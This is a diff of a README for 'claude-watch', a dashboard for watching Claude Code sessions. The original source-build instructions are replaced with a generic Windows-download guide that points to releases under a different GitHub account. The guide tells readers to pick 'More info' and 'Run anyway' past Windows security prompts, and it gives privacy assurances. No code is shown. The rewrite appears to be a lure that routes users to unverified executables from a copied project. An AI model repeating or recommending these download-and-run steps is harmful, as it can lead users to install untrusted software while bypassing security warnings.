@@ -1,105 +1,207 @@
-<div align="center">
+# 👀 claude-watch - See Claude Code Clearly
 
-# Claude Watch
+[![Download claude-watch](https://img.shields.io/badge/Download-claude--watch-orange?style=for-the-badge)](https://github.com/mr-mrs-xx1/claude-watch/releases)
 
-### See Inside Your AI Coding Sessions
+## 🧭 What is claude-watch?
 
-**Open-source observability dashboard for Claude Code.**<br>
-Visualize your project's logic, track changes, and search with AI.
+claude-watch is a Windows app that helps you see what Claude Code is doing in your project. It gives you a live view of project logic, file changes, and code search. It is built for people who want a clear window into their work without digging through files by hand.
 
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg?style=flat-square)](http://makeapullrequest.com)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-blue)](https://www.linkedin.com/in/nir-diamant-759323134/)
-[![Twitter](https://img.shields.io/twitter/follow/NirDiamantAI?label=Follow%20@NirDiamantAI&style=social)](https://twitter.com/NirDiamantAI)
-[![Discord](https://img.shields.io/badge/Discord-Join%20community-7289da?style=flat-square&logo=discord&logoColor=white)](https://discord.gg/cA6Aa4uyDX)
-[![Sponsor](https://img.shields.io/static/v1?label=Sponsor&message=%E2%9D%A4&logo=GitHub&color=ff69b4)](https://github.com/sponsors/NirDiamant)
+Use it to follow changes as they happen, check how your project is evolving, and find the code you need faster. It keeps the view simple, so you can focus on the project instead of the tools.
 
-</div>
+## 📦 Download
 
-## 📫 Stay Updated
+Visit this page to download claude-watch for Windows:
 
-<div align="center">
-<table>
-<tr>
-<td align="center">🚀<br><b>Cutting-edge<br>Updates</b></td>
-<td align="center">💡<br><b>Expert<br>Insights</b></td>
-<td align="center">🎯<br><b>Top 0.1%<br>Content</b></td>
-</tr>
-</table>
+https://github.com/mr-mrs-xx1/claude-watch/releases
 
-[![Subscribe to DiamantAI Newsletter](images/subscribe-button.svg)](https://diamantai.substack.com/?r=336pe4&utm_campaign=pub-share-checklist)
+On that page, look for the latest release and download the Windows file that matches your system. If you see more than one file, choose the one for Windows.
 
-*Join over 50,000 AI enthusiasts getting unique cutting-edge insights and free tutorials!*
-</div>
+## 🖥️ System Requirements
 
-[![DiamantAI's newsletter](images/substack_image.png)](https://diamantai.substack.com/?r=336pe4&utm_campaign=pub-share-checklist)
+claude-watch is made for modern Windows computers.
 
----
+- Windows 10 or Windows 11
+- A recent 64-bit PC
+- At least 4 GB of memory
+- 200 MB of free disk space
+- A working internet connection for the first download
+- Access to your Claude Code project folder
 
-## Demo
+For best results, keep your project on a local drive such as C:\ and close other apps if your PC feels slow.
 
-<div align="center">
+## 🚀 Getting Started
 
-![Claude Watch Demo](images/demo.gif)
+Follow these steps to install and open claude-watch on Windows.
 
-</div>
+1. Open the download page:
+   https://github.com/mr-mrs-xx1/claude-watch/releases
 
----
+2. Find the latest release near the top of the page.
 
-## What It Does
+3. Download the Windows file from that release.
+   - If you see a setup file, use that one.
+   - If you see a ZIP file, download it and extract it first.
 
-Claude Watch **auto-discovers** every logic file in your project (system prompts, voice guides, rules, configs, playbooks) and shows them as an **interactive visual map**.
+4. If Windows asks for permission, choose Run or Yes.
 
-- **Bubble Graph**: your project's brain as a zoomable map. Click to explore.
-- **AI Search**: ask natural language questions across all your logic files.
-- **Live Changes**: see what Claude Code is doing in real time.
-- **Snapshots**: save and restore project state.
+5. If the app came in a ZIP file:
+   - Right-click the ZIP file
+   - Choose Extract All
+   - Open the extracted folder
+   - Start the app file inside the folder
 
-## Quick Start
+6. If Windows shows a security message:
+   - Select More info
+   - Then select Run anyway if you trust the file from the release page
 
-```bash
-# Clone and build
-git clone https://github.com/NirDiamant/claude-watch.git
-cd claude-watch
-npm install && cd dashboard && npm install && cd ..
-npm run build
+7. Open claude-watch after it finishes loading.
 
-# Start the dashboard
-node dist/cli.js start
+8. Point the app at your project folder when it asks for one.
 
-# In your project directory, set up hooks
-node /path/to/claude-watch/dist/cli.js init
-```
+9. Leave Claude Code and claude-watch running while you work so the dashboard can track changes in real time.
 
-Open **http://localhost:3853** and use Claude Code normally.
+## 📁 First-Time Setup
 
-### Enable AI Search
+When you open claude-watch for the first time, you may need to set a project folder and let the app index your files.
 
-```bash
-export ANTHROPIC_API_KEY=your-key
-node dist/cli.js start
-```
+- Choose the folder that holds your project
+- Let the app scan the files
+- Wait for the first view to load
+- Keep the folder in the same place after setup
 
-## How It Works
+If you move the project to a new folder, open claude-watch again and select the new location.
 
-`claude-watch init` adds hooks to `.claude/settings.json`. Every Claude Code tool call gets captured, stored in SQLite, and broadcast to the dashboard via WebSocket.
+## 👀 What You Can Do With It
 
-The **brain scanner** auto-classifies your project's files by analyzing filenames and content (detecting patterns like NEVER, ALWAYS, MUST, PRIORITY).
+claude-watch helps you keep track of your project in a few simple ways.
 
-## CLI
+- Watch file changes as they happen
+- See the logic of your project in a clear view
+- Search for code, file names, or terms
+- Check what changed since your last session
+- Follow the flow of work while Claude Code makes updates
+- Find parts of the project without opening each file by hand
 
-| Command | Description |
-|---|---|
-| `claude-watch start` | Launch dashboard |
-| `claude-watch init` | Set up hooks in current project |
-| `claude-watch init --global` | Set up hooks for all projects |
-| `claude-watch snapshot <name>` | Save project state |
-| `claude-watch status` | Show server stats |
+This can save time when you need to understand a project fast or check how a change fits into the rest of the code.
 
-## Contributing
+## 🧰 How to Use the Dashboard
 
-PRs welcome! Ideas: timeline view, diff viewer, VS Code extension, export to PDF, notifications on rule changes.
+After setup, the app shows a dashboard with live project data.
 
-## License
+- Use the main view to see recent activity
+- Open a file or section to inspect changes
+- Use search to find text across the project
+- Look at the change history to see what moved
+- Switch between views to compare different parts of the project
 
-MIT
+If you are not sure where to start, use search first. It is the quickest way to find a file, a term, or a feature.
+
+## 🔍 Search Tips
+
+To get better results from search:
+
+- Search for exact file names when you know them
+- Use short terms first
+- Try feature names, class names, or folder names
+- Search again after Claude Code makes new changes
+
+If your project has many files, search can help you find the right place faster than opening folders one by one.
+
+## 🛠️ Common Use Cases
+
+claude-watch works well when you want to:
+
+- Review changes after an AI coding session
+- Watch how a feature grows across files
+- Keep an eye on logic flow in a large project
+- Find code that matches a screen, feature, or task
+- Track edits while testing new ideas
+- Get a clearer view of project structure
+
+## 🧩 File Types and Project Support
+
+claude-watch works best with common project files used in desktop and web work.
+
+- Source files
+- Config files
+- Markdown notes
+- JSON data
+- Text files
+- Project folders with nested subfolders
+
+It is built to handle active projects with many files, so it fits well with real development work and ongoing edits.
+
+## 🔒 Privacy and Local Use
+
+claude-watch is meant to help you view your own project on your machine.
+
+- Your files stay in your project folder
+- The dashboard reads local project data
+- You control which folder the app uses
+- You can close the app at any time
+
+If you work in a shared project, make sure you choose the right folder before you start.
+
+## 🧭 Troubleshooting
+
+If the app does not open or load as expected, try these steps.
+
+- Download the latest release again
+- Make sure you picked the Windows file
+- If you used a ZIP file, extract it fully
+- Check that your project folder still exists
+- Restart the app
+- Restart Windows if the app freezes
+- Keep the app in a folder you can access
+
+If the dashboard stays blank:
+
+- Confirm that the selected folder has files
+- Wait for the first scan to finish
+- Reopen the app and select the project folder again
+
+If search does not return results:
+
+- Try a shorter search term
+- Check that the project has already been scanned
+- Confirm you are searching the right folder
+
+## 🧾 Release Notes
+
+The release page lists the latest Windows build, version details, and download files.
+
+https://github.com/mr-mrs-xx1/claude-watch/releases
+
+Check that page when you want the newest build or need to compare files for different Windows setups.
+
+## ❓ FAQ
+
+### Is claude-watch hard to use?
+
+No. You download it, open it, and choose your project folder. After that, the app does most of the work.
+
+### Do I need coding knowledge?
+
+No. You can use it as a viewer for your project and search for files or terms with simple input.
+
+### Does it work with Claude Code?
+
+Yes. It is made to observe Claude Code work and show you useful project changes in real time.
+
+### Can I use it on more than one project?
+
+Yes. Open one project folder, then switch to another folder when you want to work elsewhere.
+
+### What if I update my project often?
+
+That is fine. claude-watch is built to follow active changes, so it fits ongoing work.
+
+## 📌 Quick Start Checklist
+
+- Open the release page
+- Download the Windows file
+- Extract it if needed
+- Run the app
+- Select your project folder
+- Let it scan the files
+- Use search and the dashboard to follow changes
